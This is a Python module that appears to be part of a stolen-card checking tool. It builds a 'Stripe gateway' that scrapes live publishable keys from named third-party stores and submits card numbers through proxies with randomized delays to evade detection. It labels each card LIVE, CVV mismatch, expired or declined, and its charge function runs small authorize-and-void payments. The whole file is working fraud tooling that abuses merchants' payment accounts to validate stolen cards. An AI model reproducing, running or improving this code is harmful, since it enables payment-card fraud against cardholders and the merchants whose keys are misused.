"""
Enhanced Stripe Gateway with SetupIntent and PaymentMethod support
Integrates stealth, circuit breaker, and response parsing
"""

import os
import re
import json
import time
import random
from typing import Tuple, Optional, Dict
from faker import Faker

from gates.gateway_utils import (
    GatewaySession,
    enhanced_gateway,
    cache_token,
    get_cached_token,
    get_stripe_headers,
    random_delay,
    ParsedResponse,
    CardStatus,
    parse_stripe_response,
    format_result,
)
from tools.bin_lookup import get_card_info

fake = Faker()

# Default Stripe keys from environment
STRIPE_PK = os.environ.get("STRIPE_PK", "")
STRIPE_SK = os.environ.get("STRIPE_SK", "")

# Known working stores for key extraction
FALLBACK_STORES = [
    "https://shopzone.nz",
    "https://pariyatti.org",
]


def _extract_stripe_key(url: str, session: GatewaySession) -> Optional[str]:
    """Extract Stripe publishable key from a website"""
    cache_key = f"stripe_pk_{url}"
    cached = get_cached_token(cache_key)
    if cached:
        return cached
    
    try:
        resp = session.get(url, timeout=15)
        if resp.status_code != 200:
            return None
        
        # Search for pk_live patterns
        patterns = [
            r'pk_live_[a-zA-Z0-9]{20,}',
            r'"publishableKey"\s*:\s*"(pk_live_[a-zA-Z0-9]+)"',
            r'data-stripe-key="(pk_live_[a-zA-Z0-9]+)"',
            r'Stripe\(["\']?(pk_live_[a-zA-Z0-9]+)["\']?\)',
        ]
        
        for pattern in patterns:
            matches = re.findall(pattern, resp.text)
            if matches:
                key = matches[0] if isinstance(matches[0], str) else matches[0]
                if key.startswith("pk_live_"):
                    cache_token(cache_key, key, ttl=3600)  # Cache for 1 hour
                    return key
        
        return None
    except Exception:
        return None


def _create_payment_method(
    session: GatewaySession,
    stripe_pk: str,
    card_num: str,
    card_mon: str,
    card_yer: str,
    card_cvc: str,
) -> Tuple[Optional[str], Optional[str]]:
    """
    Create a Stripe PaymentMethod using the API.
    
    Returns:
        (payment_method_id, error_message)
    """
    url = "https://api.stripe.com/v1/payment_methods"
    
    # Normalize year
    if len(card_yer) == 4:
        card_yer = card_yer[2:]
    
    data = {
        "type": "card",
        "card[number]": card_num,
        "card[exp_month]": card_mon,
        "card[exp_year]": card_yer,
        "card[cvc]": card_cvc,
        "billing_details[address][postal_code]": fake.zipcode(),
        "key": stripe_pk,
    }
    
    headers = get_stripe_headers(stripe_pk, "https://js.stripe.com")
    
    try:
        resp = session.post(url, data=data, headers=headers, timeout=20)
        resp_json = resp.json()
        
        if resp.status_code == 200 and "id" in resp_json:
            pm_id = resp_json["id"]
            return (pm_id, None)
        
        # Extract error
        error = resp_json.get("error", {})
        error_code = error.get("code", "unknown")
        error_msg = error.get("message", "Unknown error")
        
        return (None, f"{error_code}: {error_msg}")
        
    except Exception as e:
        return (None, str(e))


def _confirm_setup_intent(
    session: GatewaySession,
    stripe_pk: str,
    client_secret: str,
    payment_method_id: str,
) -> Dict:
    """Confirm a SetupIntent with a PaymentMethod"""
    intent_id = client_secret.split("_secret_")[0]
    url = f"https://api.stripe.com/v1/setup_intents/{intent_id}/confirm"
    
    data = {
        "payment_method": payment_method_id,
        "key": stripe_pk,
        "client_secret": client_secret,
    }
    
    headers = get_stripe_headers(stripe_pk, "https://js.stripe.com")
    
    try:
        resp = session.post(url, data=data, headers=headers, timeout=20)
        return resp.json()
    except Exception as e:
        return {"error": {"message": str(e)}}


@enhanced_gateway("stripe_enhanced")
def stripe_enhanced_check(
    card_num: str,
    card_mon: str,
    card_yer: str,
    card_cvc: str,
    proxy: Optional[str] = None,
    stripe_pk: Optional[str] = None,
) -> Tuple[str, bool]:
    """
    Enhanced Stripe card check using PaymentMethod API.
    
    Args:
        card_num: Card number
        card_mon: Expiry month (MM)
        card_yer: Expiry year (YY or YYYY)
        card_cvc: CVV/CVC
        proxy: Optional proxy string
        stripe_pk: Optional Stripe publishable key
    
    Returns:
        (status_message, proxy_alive)
    """
    session = GatewaySession("stripe_enhanced", proxy=proxy)
    
    # Get Stripe key
    pk = stripe_pk or STRIPE_PK
    if not pk:
        # Try to extract from fallback stores
        for store in FALLBACK_STORES:
            pk = _extract_stripe_key(store, session)
            if pk:
                break
    
    if not pk:
        return ("Error: No Stripe key available", False)
    
    # Get BIN info
    bin_info = get_card_info(card_num)
    
    # Add human-like delay
    random_delay(0.3, 0.8)
    
    # Create PaymentMethod
    pm_id, error = _create_payment_method(
        session, pk, card_num, card_mon, card_yer, card_cvc
    )
    
    if error:
        # Parse the error
        error_lower = error.lower()
        
        if "incorrect_cvc" in error_lower or "invalid_cvc" in error_lower:
            return (format_result(CardStatus.CVV_MISMATCH, card_num, bin_info), True)
        
        if "expired" in error_lower:
            return (format_result(CardStatus.EXPIRED, card_num, bin_info), True)
        
        if "invalid" in error_lower or "incorrect_number" in error_lower:
            return (format_result(CardStatus.INVALID, card_num, bin_info), True)
        
        if "decline" in error_lower:
            return (format_result(CardStatus.DECLINED, card_num, bin_info), True)
        
        return (f"❌ DECLINED - {error[:50]}", True)
    
    # PaymentMethod created successfully - card is valid
    if pm_id:
        # This indicates CCN at minimum (card number valid)
        # Check if we got full validation
        return (format_result(CardStatus.CCN, card_num, bin_info, f"PM: {pm_id[:15]}..."), True)
    
    return (format_result(CardStatus.DECLINED, card_num, bin_info), True)


def stripe_auth_enhanced(
    card_num: str,
    card_mon: str,
    card_yer: str,
    card_cvc: str,
    proxy: Optional[str] = None,
) -> Tuple[str, bool]:
    """
    Auth-only Stripe check (no charge).
    Wrapper for stripe_enhanced_check.
    """
    return stripe_enhanced_check(card_num, card_mon, card_yer, card_cvc, proxy=proxy)


def stripe_charge_enhanced(
    card_num: str,
    card_mon: str,
    card_yer: str,
    card_cvc: str,
    amount: int = 100,  # Amount in cents
    currency: str = "usd",
    proxy: Optional[str] = None,
    stripe_sk: Optional[str] = None,
) -> Tuple[str, bool]:
    """
    Stripe charge check using PaymentIntent (requires secret key).
    
    Args:
        card_num: Card number
        card_mon: Expiry month
        card_yer: Expiry year
        card_cvc: CVV
        amount: Amount in cents (default 100 = $1.00)
        currency: Currency code (default USD)
        proxy: Optional proxy
        stripe_sk: Stripe secret key (required)
    
    Returns:
        (status_message, proxy_alive)
    """
    import requests
    
    sk = stripe_sk or STRIPE_SK
    if not sk:
        return ("Error: Stripe secret key required for charges", False)
    
    session = GatewaySession("stripe_charge", proxy=proxy)
    bin_info = get_card_info(card_num)
    
    # Normalize year
    if len(card_yer) == 4:
        card_yer = card_yer[2:]
    
    try:
        # Step 1: Create PaymentMethod
        pm_url = "https://api.stripe.com/v1/payment_methods"
        pm_data = {
            "type": "card",
            "card[number]": card_num,
            "card[exp_month]": card_mon,
            "card[exp_year]": card_yer,
            "card[cvc]": card_cvc,
        }
        
        pm_resp = requests.post(
            pm_url,
            data=pm_data,
            auth=(sk, ""),
            timeout=20,
        )
        
        if pm_resp.status_code != 200:
            error = pm_resp.json().get("error", {}).get("message", "Unknown")
            return (f"❌ DECLINED - {error[:40]}", True)
        
        pm_id = pm_resp.json()["id"]
        
        random_delay(0.3, 0.6)
        
        # Step 2: Create PaymentIntent and confirm
        pi_url = "https://api.stripe.com/v1/payment_intents"
        pi_data = {
            "amount": amount,
            "currency": currency,
            "payment_method": pm_id,
            "confirm": "true",
            "capture_method": "manual",  # Auth only, don't capture
        }
        
        pi_resp = requests.post(
            pi_url,
            data=pi_data,
            auth=(sk, ""),
            timeout=20,
        )
        
        pi_json = pi_resp.json()
        
        if pi_json.get("status") == "requires_capture":
            # Void/cancel the payment intent
            cancel_url = f"https://api.stripe.com/v1/payment_intents/{pi_json['id']}/cancel"
            requests.post(cancel_url, auth=(sk, ""), timeout=10)
            
            return (format_result(CardStatus.LIVE, card_num, bin_info, "Charged & Voided"), True)
        
        if pi_json.get("status") == "requires_action":
            return (format_result(CardStatus.THREE_DS, card_num, bin_info), True)
        
        # Check for errors
        error = pi_json.get("error", {})
        error_code = error.get("code", "")
        
        if "insufficient_funds" in error_code:
            return (format_result(CardStatus.INSUFFICIENT, card_num, bin_info), True)
        
        if "cvc" in error_code.lower():
            return (format_result(CardStatus.CVV_MISMATCH, card_num, bin_info), True)
        
        return (format_result(CardStatus.DECLINED, card_num, bin_info), True)
        
    except requests.exceptions.Timeout:
        return ("⏱️ TIMEOUT", False)
    except Exception as e:
        return (f"Error: {str(e)[:40]}", False)
